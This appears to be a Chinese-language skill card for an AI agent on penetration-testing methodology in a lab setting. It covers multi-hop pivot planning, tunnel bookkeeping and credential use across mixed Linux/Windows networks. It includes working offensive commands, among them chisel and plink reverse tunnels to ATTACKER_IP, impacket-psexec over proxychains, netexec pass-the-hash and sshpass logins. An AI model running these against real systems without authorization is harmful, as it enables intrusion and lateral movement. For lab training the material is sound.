---
name: 'multi-hop-pivot-planning'
description: '已控住 ≥1 台内网主机、面前有多个网段或多条隧道时来查:先画隧道拓扑再连、正向还是反向、N 条隧道并存怎么不串味、隧道断还是目标断、Linux/Windows 混编网络里凭据语义与横向方向不对称。单条隧道怎么连转 tunneling-port-forwarding,本卡只管它上面的规划层。（检索词：multi-hop/multi hop/pivot/pivoting/pivot chain/pivot-chain/tunnel/tunneling/chisel/ligolo/ligolo-ng/proxychains/socat/ssh -D/ssh -R/ssh -L/sshuttle/port forward/port-forward/端口转发/混合 OS/mixed OS/mixed-os/cross-platform/cross platform/跨平台/跨 OS/多跳/跳板/隧道拓扑/egress/出站/网段/planning）'
whenToUse: '控住一台以上主机、发现新网段或需要同时维持多条隧道时加载;单条隧道怎么连转 tunneling-port-forwarding,网段与凭据台账转 engagement-inventory-and-triage'
metadata: { domain: network, tier: T2 }
---

# 多跳隧道规划与混合 OS 跨平台推进

> 🔷 Pro Lab 方法论卡（架构推导，非语料回灌）—— 尚未经 Pro Lab 实战检验

> 🔑 本卡是 `tunneling-port-forwarding` 的**上层**：那张卡回答「这条隧道怎么连」，本卡回答「要不要连、连哪条、同时开着 N 条时怎么不串味」。命令一律复用它的已验证形态，不重新推导。

## 触发信号 / 适用处境

- 已控住 ≥1 台内网主机，它的 `ip route` 里有台账上没有的网段
- 正准备「顺手连一条隧道」，但没想清楚它通向哪、值不值
- 同时开着两条以上隧道，开始记不清哪条通哪段
- 某工具突然不工作，分不清是**隧道断了**还是**目标挂了**
- 手里有凭据，但环境 Linux/Windows 混编，不确定它能登哪边
- 要选一台机器长期当跳板，但不确定选哪台

## 前置准备

**1. 台账网络轴必须先存在**（`engagement-inventory-and-triage` 有三轴模板，本卡不重复其表结构），本卡所有判断以它为准。**2. 隧道登记表**：每条隧道记 `类型 / 本地入口 / 经过的跳板 / 能到的网段 / 现状(通·半死·断)`，建/断都要改。

**3. 开工前盘点现场（不凭记忆）+ 建隧道前端口占用预检**（`tunneling-port-forwarding` §1.6 实测：一个端口绑定失败 → 整条会话一起报废）：

```bash
ss -lntp | grep -E 'chisel|proxy|ssh|socat'; ip route show | grep ligolo
for p in 88 445 5985; do ss -lntH "sport = :$p" | grep -q . && echo "$p BUSY"; done
```

## 模式 1: 先画拓扑再连（新主机 → 广度三件事 → 台账 → 才决定连不连）

🔴 **顺序不能反。** 路径选择依赖图（架构 §四）：图不全时无法判断哪条路便宜，先连隧道 = 押注一条可能毫无价值的路径。每拿下新主机，**先做广度三件事**（网络发现 / 身份发现 / 凭据发现），**再做深度利用**：

```bash
ip a; ip route; cat /etc/hosts; arp -a           # ① 网络发现:能看到哪些新网段
systemctl status sssd 2>/dev/null; cat /etc/krb5.conf; id <domainuser>   # ② 身份发现
# ③ 凭据发现:这台机器上有什么 → 完整载体清单转 credential-hunting-locations
#   Windows 侧对应: ipconfig /all; route print; nltest /domain_trusts; whoami /all
```

做完三件**立刻回台账**（网络轴 + 凭据轴 + 未决队列），然后才问值不值得为它建隧道。

🔷 **判据：只有它通向台账里不存在的网段，或它是通往某已有网段的唯一跳板时，才建隧道。**「又一台同网段成员机」→ 不建（架构 §五 反例：那是广度不是深度）。

## 模式 2: 正向 vs 反向 — 选择判据

**正向**＝我连它，前提是目标端口从攻击机**直连可达**（跳板已开隧道服务端口），攻击机侧无 listener、跳板重启即断。**反向**＝它连我，前提是跳板能**出站**到攻击机（边界只放行出站 / 跳板在 NAT 后），攻击机持 listener、跳板重连即恢复，**需要稳定监听**。

🔷 **① 只要跳板能出站到攻击机 → 一律优先反向**（攻击机可达性通常比内网跳板差，反向把「谁主动」交给内网侧）；**② 只有跳板不可出站**、或需第三方工具从攻击机直连某端口时才用正向；**③ 需要整个网段透明可达** → 不用端口转发，用 TUN（ligolo）或 sshuttle。

```bash
./chisel server -p 8000 --reverse; ./chisel client ATTACKER_IP:8000 R:socks   # 反向 SOCKS
./chisel client ATTACKER_IP:8000 R:1081:socks                                 # 第二条隧道必须显式换端口(对应 §3.1)
sudo ip route add 10.10.10.0/24 dev ligolo   # 透明整段(先建 TUN,见下卡 §2.1)
```

🔷 判断「跳板能不能出站到攻击机」要**实测**，不要假设（`/dev/tcp` 形态见 `living-off-the-land`）。

## 模式 3: 多隧道并存的四条纪律

**3.1 一隧道一端口，永不复用 1080。** 每条隧道分配唯一且写进台账的本地端口（T1=1080、T2=1081…），各配独立 proxychains 配置。🔷 **多隧道一律 `strict_chain`**：`dynamic_chain` 会**跳过挂掉的代理继续往下走**，把「隧道断了」变成「流量悄悄换了出口」；`strict_chain` 是 **fail-fast**，让失败可见。（注意 §3.1 的「一配置一代理」前提下，同一份配置里**没有下一个可跳**，所以这里要防的是**配置写错**而不是自动换道；而且 proxychains 每条连接会打印实际使用的链，跳过并非完全静默。两种链写法见下卡 §7.1。）

**3.2 哪条隧道在承载这个工具。** 🔷 工具不带隧道身份 = 无法归因。三条做法：每网段一份配置，用 `proxychains4 -f <该段配置> …`，配置文件名就是隧道身份；用**只有该隧道能到达的端口**做 canary（先 `proxychains4 -f <cfg> curl http://<该段独有服务>/`，通了再跑真工具）；在跳板上反查（跳板侧 `ss -tnp` 出现你刚发起的连接 = 这条隧道确实在承载）。🔷 TUN 模式另有一类冲突：**同一网段被两条隧道声明**。⚠️ 「内核路由表只有一条生效」这个**机制我未核实** —— ligolo-ng 的 proxy 只用**一个** TUN，靠内部 session 表选 agent，agent 选择未必走内核路由；但**运维规则是稳的**：`ip route show | grep ligolo` 每个网段只应有一条路由（重复 `ip route add` 通常会直接报 `File exists`），出现两条**必须删一条**，且多跳场景让**深层网段只由最深处那条隧道声明**。

**3.3 隧道断 vs 目标断 —— 四步分辨。** 🔴 **不要用 `nc -z` 判断隧道健康**：listener 由 server 持有，TCP 三次握手成功但 client 已死 → 常态假阳性（下卡 §1.6 实测）。

```bash
ss -lntp | grep chisel                          # ① 本地入口还在监听吗
ldapsearch -x -H ldap://127.0.0.1:1389 -s base -b "" dnsHostName   # ② 真实协议栈探
./chisel --version                              # ④ 两端版本一致性
# ③ 在跳板上直连目标:跳板→目标通 = 目标没死,是隧道死了
```

| 攻击机→隧道 | 跳板→目标 | 结论 |
|---|---|---|
| 失败 | 成功 | **隧道断** → `taskkill /IM chisel.exe /F` → 重启 server → 重启 client |
| 成功 | 失败 | **目标断** → 服务挂了/被重置，回台账改状态 |
| 失败 | 失败 | 先修隧道再判断目标，不要同时猜两件事 |

🔴 版本不一致的症状极具欺骗性（两边都说 Connected、端口也 listen 了，流量就是过不去且零报错）→ **上传前就对齐版本**。

## 模式 4: 隧道 ↔ 网段映射（台账网络轴）

🔴 这张表就是 `engagement-inventory-and-triage` 网络轴的具体形态，**每次建/断隧道都要改它**：

| 网段 | 可达途径（隧道号） | 本地入口 | 段内已控 / 未验证 |
|---|---|---|---|
| 172.16.1.0/24 | T1 (chisel via pivot01) | 127.0.0.1:1080 | pivot02 / 172.16.1.1, .20 |
| 192.168.1.0/24 | T2 (ligolo via pivot02) | dev ligolo | — / 全段 |

🔷 两条硬规矩：**① 没进这张表的网段 = 你到不了**（哪怕你「记得好像通」）；**②「谁穿谁」必须显式写** —— T2 是通过 T1 建立的（chisel 串联见下卡 §8 场景 4）→ **T1 断则 T2 必然一起断**；不写这层依赖，T1 挂了你会去查 T2 本身。

## 模式 5: 跳板主机的选择

🔷 以下全部是经验判据，未经 Pro Lab 实战检验。**好跳板**：可达性正是你要的（双网卡 / 路由表里有目标网段，**唯一硬条件**）· 访问方式**持久**（SSH key / 落地 webshell / 本地账号，而非只有一条内存里的反弹 shell）· 稳定（长期运行的服务器）· 低噪声（不打算把它当最终目标）· 能跑你的工具（没被 AppLocker/CLM 拦，见 `applocker-clm-bypass`）。**坏跳板**：靠一次性漏洞拿到的（服务一重启就没了）· 只通过不稳定通道可达的 · 本身就是高价值目标的 · 有 EDR/AV 会定期清进程的。

🔷 纪律：一台主机可以同时是「目标」和「跳板」，但**不要用已经是最终目标的那台当跳板** —— 优先中转机，把目标机留到最后。

## 模式 6: 混合 OS —— 凭据语义不同（不是一回事）

🔴 不同 OS 的凭据**形态不同、能用的地方不同**，不能互相套用。

| 凭据形态 | 能直接用在 | 🔴 不能直接用在 |
|---|---|---|
| Linux 口令哈希（`$6$`/`$y$`，来自 `/etc/shadow`、SSSD `.ldb`） | 破明文后 SSH/su/sudo | Windows 任何服务（不认 crypt 哈希） |
| Windows NT hash（SAM/LSASS/DCSync） | Windows SMB/WinRM/RDP(Restricted Admin) —— PtH | **Linux SSH**（OpenSSH 不接受 NT hash） |
| 明文口令 | 两边都能用 | — |
| Kerberos 票据（ccache/kirbi） | Windows 服务 + 配了 GSSAPI 的 Linux 服务 | 没配 Kerberos 的 Linux 主机 |
| SSH 私钥 | Linux SSH（Windows 自带 OpenSSH 也认） | Windows SMB/WinRM |
| 证书（.pfx，ADCS 模板） | Windows PKINIT / ADCS 链 | 一般 Linux 服务 |

🔴 **「在 Linux 上拿到一组域账号」≠「能在 Windows 上 PtH」**，反之亦然。凭据入台账必须记**类型**，不能只记值（架构 §三 凭据轴）。

## 模式 7: 混合 OS —— Kerberos 可用性必须显式验证

🔴 Linux 主机**不一定配了 Kerberos**。没配时域账号在它上面可能只能用**明文口令**（甚至完全用不了）。

```bash
cat /etc/krb5.conf      # 有 realm/kdc 才算配了 Kerberos
id <domainuser>         # 能解析出域 UID/GID 才算真加入域
klist                   # 有没有现成票据缓存
```

| 现象 | 含义 / 对策略的影响 |
|---|---|
| `id <domainuser>` 能解析 + `krb5.conf` 有 realm | 真域成员，可用 Kerberos；缓存凭据可能在 `/var/lib/sss/db/`（转 `federation-identity-abuse`） |
| `id <domainuser>` 解析失败 | 大概率**不是域成员** → 域账号只能用明文口令，**PtH 无意义**。⚠️ **别只看 `krb5.conf`**：SSSD/Winbind 走 LDAP 也能解析身份而无需 krb5.conf；反过来非域成员也可能装过 krb5.conf —— **两个条件独立** |
| 有 `sssd.conf` 但只配 LDAP bind | 只做身份查询、不做 Kerberos 认证 → 别指望票据；bind 口令本身可能是凭据（转 `credential-hunting-locations`） |

🔴 **不要假设「域账号在任何机器上都能用同一种方式认证」。** 这是必须**显式验证**的问题，不是可以推断的问题。

## 模式 8: 混合 OS —— 横向方向不对称

🔷 方向对照表（经验整理，未经 Pro Lab 实战检验）：

| 方向 | 可用认证方式 | 工具链 | 主要障碍 |
|---|---|---|---|
| Linux → Windows | 明文 / NT hash (PtH) / 票据 / 证书 | impacket、nxc、evil-winrm、xfreerdp | 需 SMB/WinRM/RDP **经隧道可达**；Kerberos 还需 DC 可达 + 时钟同步 |
| Windows → Linux | 明文 / SSH 私钥 / Kerberos（仅当该 Linux 加入域且配了 GSSAPI） | 自带 `ssh.exe` / `plink.exe` / `scp` | Windows 上通常没有 Python/impacket（impacket 本身是**纯 Python**，装了就能跑）；**NT hash 对 SSH 无效**；只有 hash 时必须先破明文 |
| Linux → Linux | 明文 / SSH key / ccache | `ssh` / `sshpass` / proxychains | 几乎无认证障碍 |
| Windows → Windows | 明文 / NT hash / 票据 / 证书 | impacket、nxc、evil-winrm、Rubeus | 需隧道；**NTLM 被禁**时改走 Kerberos（转 `kerberos-only-ad`）。⚠️ 别把 SMB signing 与 NTLM 被禁混为一谈：signing 只挡 **NTLM 中继**，PtH/PtT 照样能用（转 `ntlm-relay-chain`） |

🔴 两个最容易踩的不对称：**① Windows → Linux 时手里只有 NT hash** → SSH 用不了，要么先破明文（`password-attacks`），要么找 SSH key；**② Linux → Windows 时没有 mimikatz/Rubeus** → 不等于做不了，impacket 的 `getTGT`/`getST`/`secretsdump` 是等价物（转 `lateral-movement`）。

```bash
proxychains4 impacket-psexec domain/user:pass@172.16.1.10     # Linux 攻击机走隧道打 Windows
echo y | plink.exe -P 22 -l user -pw pass -R 3389:127.0.0.1:3389 ATTACKER_IP   # Windows 跳板
```

🔷 Windows 跳板若既无 `ssh.exe` 也无 plink，还有 `netsh interface portproxy` 一类本机转发能力 —— **具体子命令形态未在库内验证**，用前先 `netsh interface portproxy /?` 确认。

## 模式 9: 跨 OS 最小验证 —— 先验一条再铺开

🔴 架构 §八 纪律：**不要假设「我在 Linux 上拿到的域账号，在 Windows 上就能 PtH」。先验一条，再铺开。**

① 从台账取**一个**凭据 → ② 选**一台**最可能的主机 + **一个**服务 → ③ 验一条：

```bash
netexec smb 172.16.1.10 -u svc_sql -H <NTHASH> --shares                     # NT hash 对 Windows
sshpass -p 'P@ssw0rd' ssh -o StrictHostKeyChecking=no user@172.16.1.20 'id' # 明文对 Linux(SSH)
kinit <domainuser>@<REALM> && klist                                         # 域账号在 Linux 走 Kerberos
```

④ **无论成败立刻入台账**，状态标成 `已验证可用 / 已验证失效`，写明**对哪个 OS、哪个服务**验证的 → ⑤ 通过后才铺开到同 OS 的其他主机/服务（转 `credential-spraying-password-reuse`）。

🔴 反模式：**跨 OS 裸喷洒** —— 拿 NT hash 去喷 SSH、拿 Linux 哈希去喷 SMB。这不是「多试一次」，是把噪声撒在没有该认证方式的地方，既慢又吵，还会让你误判凭据「失效」。

## 快速检查清单

```bash
[ ] 新主机:网络/身份/凭据 三件事做完?→ 回台账了?
[ ] 新网段:是为它建隧道,还是"顺手连一条"?反向优先?出站实测过吗?
[ ] 每条隧道:本地端口唯一?写进台账?proxychains 用 strict_chain?
[ ] 每个网段:ligolo 只有一条路由?"谁穿谁"写了吗?
[ ] 出问题:先查隧道还是先查目标?(四步分辨表)两端版本一致吗?
[ ] 凭据入账记了【类型】吗?这台 Linux 验过 krb5.conf / id 吗?
[ ] 跨 OS:该凭据在这个 OS 上有对应的认证方式吗?铺开前先验了一条吗?
```

## 教训

1. 🔴 **隧道是「图」的一部分，不是「连上就行」** —— 先画图再连，否则你在为一条可能毫无价值的路径押注。
2. 🔴 **`nc -z` 不能说隧道健康** —— listener 由 server 持有，握手成功而 client 已死是常态假阳性；用真实协议探。
3. 🔴 **多隧道场景必须 `strict_chain`** —— `dynamic_chain` 会静默跳过挂掉的代理，让你以为走 T1 实际走 T2。🔷
4. 🔴 **凭据类型 > 凭据数量** —— 明文/NT hash/票据/证书/SSH key 各有适用面；跨 OS 时「能不能用」是**必须验证**的问题，不是可以推断的问题。**Kerberos 不是 Linux 的默认能力**：没配 `krb5.conf` 的 Linux 上，域账号可能只能用明文口令，PtH 毫无意义。
5. 🔷 **好跳板 = 可达性 + 持久访问 + 稳定 + 低噪声**；不要用最终目标机当跳板。

## 相关卡

- `tunneling-port-forwarding` —— **本卡的下层**：某条隧道具体怎么连（chisel/ligolo/ssh/socat/sshuttle/plink 完整命令与故障排查）
- `engagement-inventory-and-triage` —— 模式 4 的映射表就是它网络轴的具体形态
- `prolab-engagement-playbook` —— 阶段主线与关卡：决定「要不要为这条隧道投入时间盒」
- `ad-trust-and-forest-pivot` —— 域轴上的同类路径选择问题，与本卡网络轴并行
- `lateral-movement` —— 拿到凭据后具体怎么打（PtH/PtT/PtK/PSExec/WinRM/RDP 决策树）
- `credential-spraying-password-reuse` —— 单条凭据验证通过后铺开到同 OS 其他主机/服务的流程
- `credential-hunting-locations` —— 新主机上「凭据发现」一步的完整载体清单
- `federation-identity-abuse` / `kerberos-only-ad` —— 模式 7 的深挖 / 必须全程 Kerberos 时的工具链与时钟偏差
- `living-off-the-land` / `applocker-clm-bypass` —— 跳板上没工具、或跑不了你的 agent 时
